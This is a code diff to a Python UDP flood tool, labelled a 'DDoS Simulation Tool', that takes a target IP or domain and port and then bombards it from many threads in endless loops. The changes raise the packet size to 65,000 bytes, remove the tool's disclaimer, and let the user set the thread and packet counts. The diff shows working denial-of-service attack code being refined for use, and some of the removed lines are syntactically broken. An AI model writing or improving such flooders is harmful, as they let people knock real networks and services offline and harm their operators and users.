@@ -14,12 +14,11 @@ def is_valid_ipv4(ip):
     except ipaddress.AddressValueError:
         return False
 
-def run(ip_run, port_run, times_run, threads_run):
-    data_run = random._urandom(1024)
-
+def run(ip_run, port_run, times_run):
+    data_run = random._urandom(65000)  # Increased packet size
     try:
         while True:
-            print("\033[1;31m[*]\033[0m \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""!")
+            print(f"\033[1;31m[*]\033[0m \033[1mSending UDP packets to {ip_run}:{port_run}!\033[0m")
             s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr_run = (str(ip_run), int(port_run))
 
@@ -28,77 +27,36 @@ def run(ip_run, port_run, times_run, threads_run):
             s_run.close()
 
     except KeyboardInterrupt:
-        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
+        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
         sys.exit(0)
 
     except Exception as e:
-        sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".)
+        sys.exit(f"\033[1;31m[!]\033[0m \033[1;37m{e}\033[0m")
 
 def main():
-    print("")
-    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
-    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
-    print("")
-    print("\033[1;31m[Warning]\033[1;37m This tool is for educational purposes \nonly, I am not responsible for any damages you \nhave caused or may cause, use it at your own risk!")
-    print("")
-    
+    print("\n\033[1;31mDDoS Simulation Tool\033[0m")
     while True:
         try:
-            target = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target IP or domain:\033[0m ")
+            target = input("\033[1;31m[#]\033[0m Enter target IP or domain: ")
             if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                 break
             else:
-                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP or domain.\033[0m")
+                print("\033[1;31m[!]\033[0m Invalid input. Please enter a valid target IP or domain.")
         except KeyboardInterrupt:
-            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
+            print("\n\033[1;31m[!]\033[0m Script terminated by user (Ctrl+C). Exiting.")
             sys.exit(0)
             
-    if not is_valid_ipv4(target):
-        try:
-            ip = socket.gethostbyname(target)
-            print(f"\033[1;31m[+]\033[0m Resolved \033[1;38;2;255;100;100m{target}\033[0m to \033[1;38;2;255;100;100m{ip}\033[1;37m")
-        except socket.error as e:
-            print("\033[1;31m[!]\033[0m \033[1;37mError resolving the target: {}\033[0m".format(e))
-            sys.exit(1)
-    else:
-        ip = target
+    ip = socket.gethostbyname(target) if not is_valid_ipv4(target) else target
+    print(f"\033[1;31m[+]\033[0m Resolved {target} to {ip}")
 
-    while True:
-        try:
-            port = int(input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target port: \033[0m "))
-            break
-        except ValueError:
-            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the port.\033[0m")
-        except KeyboardInterrupt:
-            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
-            sys.exit(0)
+    port = int(input("\033[1;31m[#]\033[0m Enter target port: "))
 
-    times = 99999999
-    threads = 999999999999999999999999999999999999999999999999999999999
-        data = random._urandom(1024)
-    i = random.choice(("\033[1;31m[*]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[#]\033[0m"))
-    error_occurred = False
-
-    try:
-        while True:
-            print(i +" \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip), int(port))
-            for x in range(times):
-                s.sendto(data, addr)
-            s.close()
-
-    except KeyboardInterrupt:
-        print("\n\033[1;31m[!]\033[0m ""\033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
-        sys.exit(0)
-
-    except Exception as e:
-        if not error_occurred:
-            error_occurred = True
-            sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".)
+    times = int(input("\033[1;31m[#]\033[0m Enter packets per connection: "))
+    
+    threads = int(input("\033[1;31m[#]\033[0m Enter number of threads: "))
 
     for y in range(threads):
-        th = threading.Thread(target=run, args=(ip, port, times, threads))
+        th = threading.Thread(target=run, args=(ip, port, times))
         th.start()
 
 if __name__ == "__main__":
